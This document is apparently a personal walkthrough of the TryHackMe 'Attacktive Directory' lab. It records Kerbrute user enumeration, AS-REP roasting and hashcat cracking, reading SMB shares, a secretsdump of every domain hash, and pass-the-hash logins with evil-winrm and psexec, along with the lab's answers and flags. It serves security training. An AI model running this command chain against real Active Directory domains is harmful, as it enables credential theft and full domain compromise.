#Task 2 Intro Setup 
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install

apt install bloodhound neo4j

#Task 3 Enumeration Welcome to Attacktive Directory 
- What tool will allow us to enumerate port 139/445?
enum4linux

- What is the NetBIOS-Domain Name of the machine?
hint: nmap -sSVC -Pn -vv $IP
THM-AD


- What invalid TLD do people commonly use for their Active Directory Domain?
.local

#Task 4 Enumeration Enumerating Users via Kerberos 
https://github.com/ropnop/kerbrute/releases
save:
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
on my machine
vi /etc/hosts
###
10.10.186.100 spookysec.local
####


- What command within Kerbrute will allow us to enumerate valid usernames?
hint: ./kerbrute -h
userenum


- What notable account is discovered? (These should jump out at you)
hint: ./kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/spooky/userlist.txt -t 100
2021/07/25 09:53:07 >  [+] VALID USERNAME:       james@spookysec.local
2021/07/25 09:53:10 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2021/07/25 09:53:12 >  [+] VALID USERNAME:       James@spookysec.local
2021/07/25 09:53:14 >  [+] VALID USERNAME:       robin@spookysec.local
2021/07/25 09:53:28 >  [+] VALID USERNAME:       darkstar@spookysec.local
2021/07/25 09:53:33 >  [+] VALID USERNAME:       administrator@spookysec.local
2021/07/25 09:53:45 >  [+] VALID USERNAME:       backup@spookysec.local
2021/07/25 09:53:54 >  [+] VALID USERNAME:       paradox@spookysec.local
2021/07/25 09:54:45 >  [+] VALID USERNAME:       JAMES@spookysec.local
2021/07/25 09:54:56 >  [+] VALID USERNAME:       Robin@spookysec.local
2021/07/25 09:55:56 >  [+] VALID USERNAME:       Administrator@spookysec.local
2021/07/25 09:58:38 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2021/07/25 09:59:36 >  [+] VALID USERNAME:       Paradox@spookysec.local
2021/07/25 10:03:39 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2021/07/25 10:05:13 >  [+] VALID USERNAME:       ori@spookysec.local
2021/07/25 10:06:25 >  [+] VALID USERNAME:       ROBIN@spookysec.local

svc-admin

- What is the other notable account is discovered? (These should jump out at you)
backup


#Task 5 Exploitation Abusing Kerberos
- We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
hint: locate GetNPUsers.py
/usr/share/doc/python3-impacket/examples/GetNPUsers.py
GetNPUsers.py -dc-ip 10.10.186.100 spookysec.local/svc-admin -no-pass
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:925331e8ffd8f49bfb71ee45c8483950$232c5a5d482464775019cf1edc27cffcc9d0dfe3ce6857621230748fdb321747184f8520beb67fb6f46ef990d4e520e562f5ff499ca9452f66478e6db17cff726fe066d70531192242c24096b968709e25a4a4a901fe088d284c3b2bc9e5c1ef684113ae3273fe3e5e269f81f4d4f50cfadb9436a6eee5b1a0822fbe70e20f5e50eee29b307a846548d4a47573ea8d510cd76f6adb26d38579b3051634052ce4a2c121a898460b87ca51f0ffa26744e7cc4f9c0e31395c1660f5c38dbb66dcde6a806e1347ea5c996e927f94da5dd738fc1ad25797ee3fbc70836970065cc7d36e396d08a43935589f3307eec4ecf3879d38
svc-admin




- Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
hint: hashcat --help | grep Kerberos
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols

Kerberos 5, etype 23, AS-REP


- What mode is the hash?
18200


- Now crack the hash with the modified password list provided, what is the user accounts password?
hint:
vi tocrack.txt
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:925331e8ffd8f49bfb71ee45c8483950$232c5a5d482464775019cf1edc27cffcc9d0dfe3ce6857621230748fdb321747184f8520beb67fb6f46ef990d4e520e562f5ff499ca9452f66478e6db17cff726fe066d70531192242c24096b968709e25a4a4a901fe088d284c3b2bc9e5c1ef684113ae3273fe3e5e269f81f4d4f50cfadb9436a6eee5b1a0822fbe70e20f5e50eee29b307a846548d4a47573ea8d510cd76f6adb26d38579b3051634052ce4a2c121a898460b87ca51f0ffa26744e7cc4f9c0e31395c1660f5c38dbb66dcde6a806e1347ea5c996e927f94da5dd738fc1ad25797ee3fbc70836970065cc7d36e396d08a43935589f3307eec4ecf3879d38

hashcat -m 18200 -a 0 tocrack.txt /home/gd/Download/rockyou.txt --force
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:925331e8ffd8f49bfb71ee45c8483950$232c5a5d482464775019cf1edc27cffcc9d0dfe3ce6857621230748fdb321747184f8520beb67fb6f46ef990d4e520e562f5ff499ca9452f66478e6db17cff726fe066d70531192242c24096b968709e25a4a4a901fe088d284c3b2bc9e5c1ef684113ae3273fe3e5e269f81f4d4f50cfadb9436a6eee5b1a0822fbe70e20f5e50eee29b307a846548d4a47573ea8d510cd76f6adb26d38579b3051634052ce4a2c121a898460b87ca51f0ffa26744e7cc4f9c0e31395c1660f5c38dbb66dcde6a806e1347ea5c996e927f94da5dd738fc1ad25797ee3fbc70836970065cc7d36e396d08a43935589f3307eec4ecf3879d38:management2005
management2005

#Task 6 Enumeration Back to the Basics 
- What utility can we use to map remote SMB shares?
hint: smbclient or smbmap


- Which option will list shares?
hint: smbclient --help | grep list
-L


- How many remote shares is the server listing?
hint: 
smbclient -L 10.10.186.100 -U 'svc-admin' 
Enter WORKGROUP\svc-admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

####
smbmap -H spookysec.local -u svc-admin -p management2005 -d spookysec.local                
[+] IP: spookysec.local:445     Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
#####
6


- There is one particular share that we have access to that contains a text file. Which share is it?
backup



- What is the content of the file?
hint: smbclient \\\\10.10.186.100\\backup -U 'svc-admin'
smbclient>dir
backup_credentials.txt 
more backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw


- Decoding the contents of the file, what is the full contents?
hint: vi decode.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

base64 --decode decode.txt
backup@spookysec.local:backup2517860 




#Task 7 Domain Privilege Escalation Elevating Privileges within the Domain 
- What method allowed us to dump NTDS.DIT?
hint: secretsdump.py --help
DRSUAPI


- What is the Administrators NTLM hash?
hint: secretsdump.py -just-dc backup@spookysec.local
Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:3a21d88b7ed936026b751027067d7159:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:d2172cdecb4414fa862cf023fd845212867bcca73a1896d1267549f1951e7c1f
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:0b6614e309af689a3145507e82304a14
ATTACKTIVEDIREC$:des-cbc-md5:2c8f3b0e1cf7a2b5
[*] Cleaning up...

0e0363213e37b94221497260b0bcb4fc


- What method of attack could allow us to authenticate as the user without the password?
Pass the hash


- Using a tool called Evil-WinRM what option will allow us to use a hash?
hint: gem install evil-winrm
evil-winrm -h
-H

#Task 8 Flag Submission Flag Submission Panel 
Flag Submission Panel
Submit the flags for each user account. They can be located on each user's desktop.
If you enjoyed this box, you may also enjoy my blog post!

Pass the hash
evil-winrm -i 10.10.186.100 -H 0e0363213e37b94221497260b0bcb4fc --user Administrator 
ps c:\user\Administrator\Document\whoami


or pass the hash
locate psexec.py
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc administrator@spookysec.local
c:\windows\system32
whoami


- svc-admin
hint: cd C:\Users\svc-admin\Desktop>
PS C:\Users\svc-admin\Desktop> get-content user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}

- backup
hint: cd C:\Users\backup\Desktop>
get-content PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}


- Administrator
hint: cd C:\Users\administrator\Desktop>
get-content root.txt
TryHackMe{4ctiveD1rectoryM4st3r}




https://floreaiulianpfa.com/attacktive-directory-try-hack-me/
https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
https://github.com/TarlogicSecurity/kerbrute
https://book.hacktricks.xyz/brute-force

https://www.cybersecpadawan.com/2020/04/walkthrough-tryhackme-attacktive.html
https://arslanblcn.github.io/posts/Tryhackme-Attacktive-Directory/
